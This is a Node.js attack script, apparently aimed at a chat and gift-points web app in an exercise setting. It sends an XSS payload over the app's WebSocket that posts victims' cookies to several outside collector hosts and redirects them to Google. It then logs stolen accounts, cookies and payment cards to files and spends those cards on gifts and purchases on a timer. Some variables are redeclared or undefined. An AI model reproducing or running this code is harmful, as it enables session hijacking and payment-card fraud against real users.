const Axios = require("axios");
const Express = require("express");
const Ws = require("ws");
const fs = require("fs");
const { URL, WS, COOKIE, HOST, STORAGE_PORT, REPL_URL, GLITCH_URL, AWS_URL, AWS_PORT, CARDS, COUNT, CARD } = require("./config");

const URL = `http: //${HOST}:${HOST_PORT}`;
const WS = `ws: //${HOST}:${HOST_PORT + 1}`;

/* Remove logs */
// console.log = () => { };
/* OP Log */
const LOG = console.log;

const App = Express();

/* Perform XSS + redirect users to google to prevent them from sending XSS messages if they visited the webpage */
// const LINK_STRING = `<a href = 'http://${HOST}:8000/Haxrox/form'>Hi</a>`
const REDIRECT_STRING = `<img src = "hi" onerror="Promise.all([fetch('http://${HOST}:${STORAGE_PORT}/Haxrox/push?access=12345678&text=' + document.cookie), fetch('${REPL_URL}?cookie=' + document.cookie), fetch('${GLITCH_URL}?cookie=' + document.cookie), fetch('${AWS_URL}:${AWS_PORT}/?cookie=' + document.cookie)]).finally(() => {document.cookie = ''; window.location.replace('https://www.google.com/');});"/>`

const Socket = new Ws(WS, [], {
    headers: {
        cookie: COOKIE,
    },
    origin: URL,
    skipUTF8Validation: true
});
    
Socket.on("open", () => {
    LOG(`WS Connection Established with: ${WS}`);
});

Socket.on("error", (err) => {
    LOG("Socket error: ", err);
})

Socket.on("close", (code, reason) => {
    LOG("Socket closed: " + code + " | " + reason);
});

Socket.on("message", (message) => {
    const data = JSON.parse(message);
    LOG(data);

    if (data?.action === "join" && data?.payload && !data?.payload?.username.includes("vicky")) {
        // Socket.send(LINK_STRING, (err, _) => {
        //     if (err) {
        //         console.log("Send URL failed: " + err);
        //     } else {
        //         console.log("Send URL success");
        //     }
        // });

        Socket.send(REDIRECT_STRING, (err, _) => {
            if (err) {
                console.log("Send redirect failed: " + err);
            } else {
                console.log("Send redirect success");
            }
        });
    }
});

function getAccount(cookie) {
    LOG("Getting account for cookie: " + cookie);
    return Axios.get(`${URL}/account`, {
        headers: {
            Cookie: cookie
        }
    });
}

async function stealMoney() {
    const promises = [];
    CARDS.forEach(card => {
        for (let index = 0; index < COUNT; index+=3) {
            promises.push(
                Axios.post(`${URL}/gift`, {
                    "recipient": "Haxrox",
                    "points": 100,
                    "payment": card
                }, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': COOKIE
                    }
                })
            );
            promises.push(
                Axios.post(`${URL}/gift`, {
                    "recipient": "WorldofKerry",
                    "points": 100,
                    "payment": card
                }, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': COOKIE
                    }
                })
            )
            promises.push(
                Axios.post(`${URL}/buy`, {
                    "points": 100,
                    "payment": card

                }, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': COOKIE
                    }
                })
            )        
        }
    });
    return Promise.all(promises).then(() => {
        console.log("Steal Success");
    }).catch(err => {
        console.log("Steal Failed: " + err);
    });
}

async function steal(cookie, log) {
    console.log("Got cookie: " + cookie);
    getAccount(cookie).then(response => {
        const data = response.data;
        const paymentCard = data.paymentCard;
        data.cookie = cookie;
        console.log("Stealing from ", typeof (data) !== "string" ? data : null);

        if (paymentCard) {
            if (paymentCard !== CARD) {
                if (log) {
                    fs.appendFile("users.txt", JSON.stringify(data) + "\n", (err, writeData) => {
                        if (err) {
                            console.log("Failed to write to users file: " + err + " | Data: " + JSON.stringify(data));
                        } else {
                            console.log("Wrote to users file: " + writeData);
                        }
                    });
                    fs.appendFile("cookies.txt", cookie + "\n", (err, writeData) => {
                        if (err) {
                            console.log("Failed to write to cookies file: " + err + " | Data: " + cookie);
                        } else {
                            console.log("Wrote to cookies file: " + writeData);
                        }
                    });
                    fs.appendFile("cards.txt", paymentCard + "\n", (err, writeData) => {
                        if (err) {
                            console.log("Failed to write to cards file: " + err + " | Data: " + paymentCard);
                        } else {
                            console.log("Wrote to cards file: " + writeData);
                        }
                    });
                }
                
                CARDS.push(paymentCard);
                stealMoney();
            }
        }
    });
}

App.get("/", (req, res) => {
    LOG("Get Request: " + req.ip);
    if (req.query.cookie) {
        steal(req.query.cookie, true);
    }

    res.status(200)
        .set("Access-Control-Allow-Origin", "*")
        .sendFile("/client/index.html", { root: __dirname });
});

App.use("/ping", (req, res) => {
    LOG("Ping Request: " + req.ip);
    res.status(200).send("Pong!")
});

App.listen(PORT, () => {
    LOG("Listening on Port: " + PORT);
});

setInterval(() => {
    LOG("Stealing ...");
    stealMoney();
}, INTERVAL);

stealMoney();